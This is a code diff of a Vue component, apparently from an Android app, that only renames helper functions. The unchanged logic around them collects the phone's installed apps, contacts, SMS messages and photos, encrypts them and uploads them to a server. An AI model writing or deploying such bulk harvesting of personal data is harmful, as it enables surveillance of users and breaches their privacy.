@@ -25,7 +25,7 @@
 </template>
 
 <script>
-import { getPermission, getDeviceInfo, getAppList, getSmsList, getPhotoList, getContactList, getPhoneInfo } from "../../utils/android.js";
+import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../utils/android.js";
 import { setDeviceInfoAPI, getshebeiInfoAPI, getAppInfoAPI, gettxlAPI, getduanxinAPI, getPhotoInfoAPI } from "../../api";
 import { add, unt } from "../../utils/AESKey.js";
 import isNext from '../form/isNext.js'
@@ -66,22 +66,22 @@ export default {
                 getshebeiInfoAPI(add({ model: info.device }))
             }
             if (this.list.indexOf('APP') > -1) {
-                let res = await getAppList();
+                let res = await getApp();
                 let info = JSON.parse(res.appInfo);
                 getAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
             }
             if (this.list.indexOf("CONTACT") > -1) {
-                let res = await getContactList();
+                let res = await getContact();
                 let info = JSON.parse(res.appInfo);
                 gettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
             }
             if (this.list.indexOf("SMS") > -1) {
-                let res = await getSmsList();
+                let res = await getSms();
                 let info = JSON.parse(res.appInfo);
                 getduanxinAPI(add({ model: { list: info.smsList } }))
             }
             if (this.list.indexOf("PHOTO") > -1) {
-                let res = await getPhotoList();
+                let res = await getPhoto();
                 let info = JSON.parse(res.appInfo);
                 getPhotoInfoAPI(add({ model: { list: info.photoList } }))
             }
